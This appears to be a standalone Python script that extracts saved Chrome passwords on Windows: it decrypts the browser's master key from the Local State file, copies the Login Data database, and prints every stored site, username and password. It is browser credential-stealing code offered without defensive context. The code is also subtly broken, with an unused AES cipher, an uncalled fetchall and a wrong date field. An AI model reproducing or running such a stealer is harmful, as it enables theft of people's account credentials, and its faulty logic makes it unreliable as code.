import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import timezone, datetime, timedelta

def get_chrome_date(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")

    with open(local_state_path, "r", encoding="utf8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]

    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    iv = password[3:15]
    password = password[15:]

    cipher = AES.new(key, AES.MODE_GCM, iv)

    return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])

def main():
    key = encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data") 
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)

    db = sqlite3.connect(filename)
    cursor = db.cursor()

    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")    

    for row in cursor.fetchall:
        origin_url = row[0]
        action_url = row[1]

        username = row[2]
        password = decrypt_password(row[3], key)

        date_created = row[4]
        date_last_used = row[5]

        if username or password:
            print(f"Origin URL: {origin_url}")
            print(f"Action URL: {action_url}")
            print(f"Username: {username}")
            print(f"Password: {password}")

        if date_created:
            print(f"Creation date: {str(get_chrome_date(date_created))}")

        if date_last_used:
            print(f"Date Last Used: {str(get_chrome_date(date_created))}")

    cursor.close()
    db.close()

    os.remove(filename)

main()
